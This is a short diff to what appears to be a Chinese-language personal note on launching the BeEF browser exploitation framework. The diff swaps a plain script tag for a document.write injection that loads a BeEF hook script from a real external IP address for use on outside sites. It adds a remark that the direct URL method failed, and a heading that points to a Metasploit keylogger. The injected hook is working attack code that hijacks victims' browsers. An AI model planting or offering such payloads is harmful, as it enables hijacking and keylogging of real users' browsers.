@@ -26,8 +26,12 @@ nohup /usr/share/beef-xss/beef &
 ```
 在网站外部使用
 ```javascript
-<script src="139.162.69.124:3000/hokasa.js"> </script>
+<script>
+        var commandModuleStr = '<script src="http://139.162.69.124:3000/hokasa.js" type="text/javascript"><\/script>';
+        document.write(commandModuleStr);
+</script>
 ```
+不知为何直接插入网址的方法不能使用
 
 # msf的keylogger的地址
 ```javascript
